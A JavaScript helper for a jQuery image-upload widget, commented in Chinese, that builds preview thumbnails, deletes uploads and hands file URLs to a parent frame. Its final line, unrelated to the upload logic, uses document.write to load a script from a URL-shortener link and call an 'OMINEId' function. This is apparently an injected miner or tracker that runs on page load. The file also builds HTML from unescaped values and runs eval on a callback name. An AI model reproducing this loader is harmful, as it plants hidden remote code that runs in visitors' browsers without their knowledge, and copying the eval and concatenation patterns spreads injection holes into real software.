/**
 * 
 */
function SetImgContent(data, pic){	
	var obj = data;
	if(obj.status == 1){
		var sLi = "";
		sLi += '<li class="img">';
		sLi += '<img src="' + obj.data + '" width="100" height="100" onerror="this.src=\''+pic+'\'">';
		sLi += '<input type="hidden" name="fileurl_tmp[]" value="' + obj.data + '">';
		sLi += '<a href="javascript:void(0);">删除</a>';
		sLi += '</li>';
		return sLi;
	}else{
		//window.parent.message(obj.text,8,2);
		alert(obj.message);
		return;
	}
}



function SetUploadFile(url){
	$("ul li").each(function(l_i){
		$(this).attr("id", "li_" + l_i);
	})
	$("ul li a").each(function(a_i){
		$(this).attr("rel", "li_" + a_i);
	}).click(function(){
		$.get(
			url,{filename:$(this).prev().val()},function(){}
		);
		$("#" + this.rel).remove();
	})
}

/**
 * 点击保存按钮时
 * 判断允许上传数，检测是单一文件上传还是组文件上传
 * 如果是单一文件，上传结束后将地址存入$input元素
 * 如果是组文件上传，则创建input样式，添加到$input后面
 * 隐藏父框架，清空列队，移除已上传文件样式
 */
$("#SaveBtn").click(function(){	
	var callback = callBack;
	var fileurl_tmp = [];
	if(callback != "undefined" && callback != ''){	
		if(num > 1){	
			 $("input[name^='fileurl_tmp']").each(function(index,dom){
				fileurl_tmp[index] = dom.value;
			 });	
		}else{
			fileurl_tmp.push($("input[name^='fileurl_tmp']").val());	
		}
		eval('window.parent.'+callback+'(fileurl_tmp)');
		$(window.parent.document).find("iframe.uploadframe").remove();
		return;
	}			
	if(num > 1){
			var fileurl_tmp = "";
			$("input[name^='fileurl_tmp']").each(function(){
				fileurl_tmp += '<li rel="'+ this.value +'"><input class="input-text" type="text" name='+input+'"[]" value="'+ this.value +'" /><a href="javascript:void(0);" onclick="ClearPicArr(\''+ this.value +'\',\'\')">删除</a></li>';	
			});			
			$(window.parent.document).find("#"+input).append(fileurl_tmp);
	}else{
			$(window.parent.document).find("#"+input).val($("input[name^='fileurl_tmp']").val());
	}
	Close();
});

function Close(){
	$("iframe.uploadframe", window.parent.document).remove();
}
$("#CancelBtn").click(function(){
	$("iframe.uploadframe", window.parent.document).remove();
});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
